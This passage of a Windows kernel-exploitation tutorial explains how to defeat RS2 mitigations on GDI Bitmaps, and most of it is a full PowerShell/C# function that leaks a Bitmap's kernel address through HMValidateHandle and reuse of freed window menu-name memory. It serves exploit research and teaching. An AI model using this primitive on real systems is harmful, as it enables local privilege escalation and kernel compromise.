+<p>Still, I guess, the reader's question is why do we care about Window objects? Where is my Bitmap at you bastard? Well, the Window menu name (lpszMenuName) is allocated in the same Kernel pool as our bitmap. The idea is that we allocate a large Window menu name, free it and then allocate our Bitmap which will reuse the free'd memory. This seems a bit tricky but if we make the menu name larger than 4kb it ends up in the large pool which has low'ish entropy making this UAF style leak 100% reliable. This process is almost identical to the RS1 bypass using <a href="https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/">Accelerator Tables</a>.<br /><br />
+
+The following image illustrates this process.</p>
+
+<p>&nbsp;</p>
+<img src="images/RS2-Desktop10.png">
+<p>&nbsp;</p>
+
+<p>The PowerShell function to achieve this can be seen below. For a more sensible rendition please refer to my <a href="https://github.com/FuzzySecurity/PSKernel-Primitives">PSKernel-Primitives</a> repo.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+function Stage-HmValidateHandleBitmap {
+&lt;#
+.SYNOPSIS
+	Universal x64 Bitmap leak using HmValidateHandle.
+	Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2
+	Resources:
+		+ Win32k Dark Composition: Attacking the Shadow part of Graphic subsystem &lt;= 360Vulcan
+		+ LPE vulnerabilities exploitation on Windows 10 Anniversary Update &lt;= Drozdov Yurii & Drozdova Liudmila
+
+.DESCRIPTION
+	Author: Ruben Boonen (@FuzzySec)
+	License: BSD 3-Clause
+	Required Dependencies: None
+	Optional Dependencies: None
+
+.EXAMPLE
+	PS C:\Users\b33f> Stage-HmValidateHandleBitmap |fl
+	
+	BitmapKernelObj : -7692235059200
+	BitmappvScan0   : -7692235059120
+	BitmapHandle    : 1845828432
+	
+	PS C:\Users\b33f> $Manager = Stage-HmValidateHandleBitmap
+	PS C:\Users\b33f> "{0:X}" -f $Manager.BitmapKernelObj
+	FFFFF901030FF000
+#>
+	Add-Type -TypeDefinition @"
+	using System;
+	using System.Diagnostics;
+	using System.Runtime.InteropServices;
+	using System.Security.Principal;
+	
+	public class HmValidateHandleBitmap
+	{	
+		delegate IntPtr WndProc(
+			IntPtr hWnd,
+			uint msg,
+			IntPtr wParam,
+			IntPtr lParam);
+	
+		[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
+		struct WNDCLASS
+		{
+			public uint style;
+			public IntPtr lpfnWndProc;
+			public int cbClsExtra;
+			public int cbWndExtra;
+			public IntPtr hInstance;
+			public IntPtr hIcon;
+			public IntPtr hCursor;
+			public IntPtr hbrBackground;
+			[MarshalAs(UnmanagedType.LPWStr)]
+			public string lpszMenuName;
+			[MarshalAs(UnmanagedType.LPWStr)]
+			public string lpszClassName;
+		}
+	
+		[DllImport("user32.dll")]
+		static extern System.UInt16 RegisterClassW(
+			[In] ref WNDCLASS lpWndClass);
+	
+		[DllImport("user32.dll")]
+		public static extern IntPtr CreateWindowExW(
+			UInt32 dwExStyle,
+			[MarshalAs(UnmanagedType.LPWStr)]
+			string lpClassName,
+			[MarshalAs(UnmanagedType.LPWStr)]
+			string lpWindowName,
+			UInt32 dwStyle,
+			Int32 x,
+			Int32 y,
+			Int32 nWidth,
+			Int32 nHeight,
+			IntPtr hWndParent,
+			IntPtr hMenu,
+			IntPtr hInstance,
+			IntPtr lpParam);
+	
+		[DllImport("user32.dll")]
+		static extern System.IntPtr DefWindowProcW(
+			IntPtr hWnd,
+			uint msg,
+			IntPtr wParam,
+			IntPtr lParam);
+	
+		[DllImport("user32.dll")]
+		public static extern bool DestroyWindow(
+			IntPtr hWnd);
+	
+		[DllImport("user32.dll")]
+		public static extern bool UnregisterClass(
+			String lpClassName,
+			IntPtr hInstance);
+	
+		[DllImport("kernel32",CharSet=CharSet.Ansi)]
+		public static extern IntPtr LoadLibrary(
+			string lpFileName);
+	
+		[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)]
+		public static extern IntPtr GetProcAddress(
+			IntPtr hModule,
+			string procName);
+	
+		public delegate IntPtr HMValidateHandle(
+			IntPtr hObject,
+			int Type);
+	
+		[DllImport("gdi32.dll")]
+		public static extern IntPtr CreateBitmap(
+			int nWidth,
+			int nHeight,
+			uint cPlanes,
+			uint cBitsPerPel,
+			IntPtr lpvBits);
+	
+		public UInt16 CustomClass(string class_name, string menu_name)
+		{
+			m_wnd_proc_delegate = CustomWndProc;
+			WNDCLASS wind_class = new WNDCLASS();
+			wind_class.lpszClassName = class_name;
+			wind_class.lpszMenuName = menu_name;
+			wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
+			return RegisterClassW(ref wind_class);
+		}
+	
+		private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
+		{
+			return DefWindowProcW(hWnd, msg, wParam, lParam);
+		}
+	
+		private WndProc m_wnd_proc_delegate;
+	}
+"@
+	
+	#------------------[Create/Destroy Window]
+	# Call nonstatic public method => delegWndProc
+	$AtomCreate = New-Object HmValidateHandleBitmap
+	
+	function Create-WindowObject {
+		$MenuBuff = "A"*0x8F0
+		$hAtom = $AtomCreate.CustomClass("BitmapStager",$MenuBuff)
+		[HmValidateHandleBitmap]::CreateWindowExW(0,"BitmapStager",[String]::Empty,0,0,0,0,0,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
+	}
+	
+	function Destroy-WindowObject {
+		param ($Handle)
+		$CallResult = [HmValidateHandleBitmap]::DestroyWindow($Handle)
+		$CallResult = [HmValidateHandleBitmap]::UnregisterClass("BitmapStager",[IntPtr]::Zero)
+	}
+	
+	#------------------[Cast HMValidateHandle]
+	function Cast-HMValidateHandle {
+		$hUser32 = [HmValidateHandleBitmap]::LoadLibrary("user32.dll")
+		$lpIsMenu = [HmValidateHandleBitmap]::GetProcAddress($hUser32, "IsMenu")
+		
+		# Get HMValidateHandle pointer
+		for ($i=0;$i-lt50;$i++) {
+			if ($([System.Runtime.InteropServices.Marshal]::ReadByte($lpIsMenu.ToInt64()+$i)) -eq 0xe8) {
+				$HMValidateHandleOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($lpIsMenu.ToInt64()+$i+1)
+				[IntPtr]$lpHMValidateHandle = $lpIsMenu.ToInt64() + $i + 5 + $HMValidateHandleOffset
+			}
+		}
+	
+		if ($lpHMValidateHandle) {
+			# Cast IntPtr to delegate
+			[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lpHMValidateHandle,[HmValidateHandleBitmap+HMValidateHandle])
+		}
+	}
+	
+	#------------------[lpszMenuName Leak]
+	function Leak-lpszMenuName {
+		param($WindowHandle)
+		$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
+		$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
+		if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 15063) {
+			$pCLSOffset = 0xa8
+			$lpszMenuNameOffset = 0x90
+		} else {
+			$pCLSOffset = 0x98
+			$lpszMenuNameOffset = 0x88
+		}
+	
+		# Cast HMValidateHandle & get window desktop heap pointer
+		$HMValidateHandle = Cast-HMValidateHandle
+		$lpUserDesktopHeapWindow = $HMValidateHandle.Invoke($WindowHandle,1)
+	
+		# Calculate ulClientDelta & leak lpszMenuName
+		$ulClientDelta = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+0x20) - $lpUserDesktopHeapWindow.ToInt64()
+		$KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+$pCLSOffset)
+		[System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+$lpszMenuNameOffset)
+	}
+	
+	#------------------[Bitmap Leak]
+	$KernelArray = @()
+	for ($i=0;$i -lt 20;$i++) {
+		$TestWindowHandle = Create-WindowObject
+		$KernelArray += Leak-lpszMenuName -WindowHandle $TestWindowHandle
+		if ($KernelArray.Length -gt 1) {
+			if ($KernelArray[$i] -eq $KernelArray[$i-1]) {
+				Destroy-WindowObject -Handle $TestWindowHandle
+				[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
+				$BitmapHandle = [HmValidateHandleBitmap]::CreateBitmap(0x701, 2, 1, 8, $Buffer) # +4 kb size
+				break
+			}
+		}
+		Destroy-WindowObject -Handle $TestWindowHandle
+	}
+	
+	$BitMapObject = @()
+	$HashTable = @{
+		BitmapHandle = $BitmapHandle
+		BitmapKernelObj = $($KernelArray[$i])
+		BitmappvScan0 = $KernelArray[$i] + 0x50
+	}
+	$Object = New-Object PSObject -Property $HashTable
+	$BitMapObject += $Object
+	$BitMapObject
+}</pre>
+</div>
+
+<p>Let's give that a quick go.</p>
+
+<p>&nbsp;</p>
+<img src="images/RS2-Desktop11.jpg">
+<p>&nbsp;</p>
+
+<p>The SURFOBJ structure is pretty distinct and even though we don't have any symbols for it we can easily tell the leak was successful.</p>
+
+<p>&nbsp;</p>
+<img src="images/RS2-Desktop12.jpg">
+<p>&nbsp;</p>
+
+<h2 class="title">Final Thoughts<span class="line"></span></h2>
+<p>That's it pretty much! Our much loved Bitmap primitive has survived two rounds of mitigations by Microsoft so far. Bitmaps provide a really powerful (and convenient) read/write primitive that is applicable in a wide range of Kernel exploitation scenarios. Inevitably, Microsoft will keep hammering this primitive till we lose it for good, but who know we may be back for round 3 when RS3 hits!</p>
+
+</div>
+    </div>
+</div>
+
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../../index.html">Home</a> |
+          <a href="../../tutorials.html">Tutorials</a> |
+          <a href="../../coding.html">Scripting</a> |
+          <a href="../../exploits.html">Exploits</a> |
+          <a href="../../links.html">Links</a> |
+          <a href="../../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
